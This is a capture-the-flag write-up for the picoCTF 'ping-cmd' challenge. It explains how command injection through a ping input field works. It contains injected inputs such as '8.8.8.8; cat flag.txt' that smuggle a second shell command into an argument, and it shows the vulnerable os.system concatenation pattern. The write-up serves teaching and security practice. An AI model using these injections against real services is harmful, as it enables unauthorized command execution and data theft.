# picoCTF 2026 — ping-cmd

**Category:** General Skills  
**Difficulty:** Easy  
**Points:** 100

## Challenge Description

The service asks for an IP address to ping and claims:

```text
We have tight security because we only allow '8.8.8.8'
```

The hints say:

- the program uses a shell command behind the scenes;
- sometimes you can run more than one command at a time.

That strongly suggests command injection.

## Initial Testing

Connect with netcat:

```bash
nc <HOST> <PORT>
```

A normal input such as:

```text
8.8.8.8
```

produces normal ping output.

The key question is whether our input is passed into a shell command without proper escaping.

## Testing Command Injection

The shell command separator:

```text
;
```

lets one command finish and another begin.

Try:

```text
8.8.8.8; ls
```

If the application executes:

```text
ping 8.8.8.8; ls
```

then the output should contain directory contents.

Typical output includes:

```text
flag.txt
script.sh
```

This confirms command injection.

## Reading the Flag

Now append a command that reads the file:

```text
8.8.8.8; cat flag.txt
```

A complete interaction is:

```bash
nc <HOST> <PORT>
```

Then:

```text
8.8.8.8; cat flag.txt
```

The server first runs the ping and then executes our injected `cat` command.

## Root Cause

The program is effectively doing something equivalent to:

```python
os.system("ping " + user_input)
```

or another shell invocation where `user_input` is concatenated into the command.

Because the input is interpreted by a shell, shell metacharacters such as `;` have special meaning.

## Why It Works

The intended command is:

```text
ping 8.8.8.8
```

Our input changes the command line to:

```text
ping 8.8.8.8; cat flag.txt
```

The shell interprets that as two separate commands.

## Key Takeaways

- Never concatenate untrusted input directly into shell commands.
- Shell metacharacters such as `;` can create command injection when input reaches a shell.
- The first successful test should often be a harmless command such as `id` or `ls` to confirm code execution.

## Flag

```text
picoCTF{REDACTED}
```
